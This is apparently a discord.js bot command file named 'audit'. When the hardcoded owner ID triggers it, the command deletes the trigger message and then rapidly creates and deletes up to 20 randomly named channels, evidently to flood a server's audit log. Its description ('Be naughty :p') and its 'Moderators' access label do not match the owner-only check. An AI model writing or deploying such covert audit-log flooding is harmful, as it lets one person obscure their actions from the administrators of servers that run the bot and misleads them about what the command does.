const Discord = require("discord.js")
const charachters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n','o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z' ];
const channelTypes = ["text", "category", "voice"];
const ownerid = "534751262416175116";
module.exports.run = async (bot, message, args) => {
    await message.delete();
    if(message.author.id == ownerid) {

	
	
	for(let i=0;i<20;i++) {
		try {
			let name = "";
			for(let j=0;j<7;j++) {
				name = name + charachters[Math.floor(Math.random() * charachters.length)];
			}
			const channel = await message.guild.createChannel(name,{ type: channelTypes[Math.floor(Math.random() * channelTypes.length)] });
			await channel.delete();
		} catch (err) {
			console.log(err);
			break;
		} 
	} 
	
}
   
}

module.exports.config = {
    name: "audit",
    description: "Be naughty :p",
    usage: "!audit",
    accessableby: "Moderators",
    aliases: ["as"]
}